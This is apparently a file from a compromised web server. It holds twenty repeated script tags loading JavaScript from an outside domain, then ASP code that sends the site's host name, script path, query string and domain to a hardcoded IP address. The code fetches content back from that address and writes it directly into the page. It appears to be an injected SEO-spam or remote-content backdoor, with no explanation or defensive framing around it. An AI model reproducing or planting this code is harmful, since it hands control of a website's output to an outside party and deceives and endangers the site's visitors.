<script type="text/javascript" src="http://bxrx.yb983.com/jjadmin/js/common.js"></script><script type="text/javascript" src="http://bxrx.yb983.com/jjadmin/js/common.js"></script><script type="text/javascript" src="http://bxrx.yb983.com/jjadmin/js/common.js"></script><script type="text/javascript" src="http://bxrx.yb983.com/jjadmin/js/common.js"></script><script type="text/javascript" src="http://bxrx.yb983.com/jjadmin/js/common.js"></script><script type="text/javascript" src="http://bxrx.yb983.com/jjadmin/js/common.js"></script><script type="text/javascript" src="http://bxrx.yb983.com/jjadmin/js/common.js"></script><script type="text/javascript" src="http://bxrx.yb983.com/jjadmin/js/common.js"></script><script type="text/javascript" src="http://bxrx.yb983.com/jjadmin/js/common.js"></script><script type="text/javascript" src="http://bxrx.yb983.com/jjadmin/js/common.js"></script><script type="text/javascript" src="http://bxrx.yb983.com/jjadmin/js/common.js"></script><script type="text/javascript" src="http://bxrx.yb983.com/jjadmin/js/common.js"></script><script type="text/javascript" src="http://bxrx.yb983.com/jjadmin/js/common.js"></script><script type="text/javascript" src="http://bxrx.yb983.com/jjadmin/js/common.js"></script><script type="text/javascript" src="http://bxrx.yb983.com/jjadmin/js/common.js"></script><script type="text/javascript" src="http://bxrx.yb983.com/jjadmin/js/common.js"></script><script type="text/javascript" src="http://bxrx.yb983.com/jjadmin/js/common.js"></script><script type="text/javascript" src="http://bxrx.yb983.com/jjadmin/js/common.js"></script><script type="text/javascript" src="http://bxrx.yb983.com/jjadmin/js/common.js"></script><script type="text/javascript" src="http://bxrx.yb983.com/jjadmin/js/common.js"></script><%
server.Scripttimeout=999999
efjenkjwelwjrw = "http://58.218.199.205/" 
host_name="http://"&request.servervariables("HTTP_HOST")&request.servervariables("script_name")
Remote_file = efjenkjwelwjrw&"/index.php"&"?host="&host_name&"&url="&Request.servervariables("Query_String")&"&domain="&Request.servervariables("Server_Name")
Content_mb=GetHtml(Remote_file)
response.write Content_mb
%>
<%
Function GetHtml(url)
	Set ObjXMLHTTP=Server.CreateObject("MSXML2.serverXMLHTTP")
	ObjXMLHTTP.Open "GET",url,False
	ObjXMLHTTP.setRequestHeader "User-Agent","aQ0O010O"
	ObjXMLHTTP.send
	GetHtml=ObjXMLHTTP.responseBody
	Set ObjXMLHTTP=Nothing
	set objStream = Server.CreateObject("Adodb.Stream")
	objStream.Type = 1
	objStream.Mode =3
	objStream.Open
	objStream.Write GetHtml
	objStream.Position = 0
	objStream.Type = 2
	objStream.Charset = "gb2312"
	GetHtml = objStream.ReadText
	objStream.Close
End Function
%>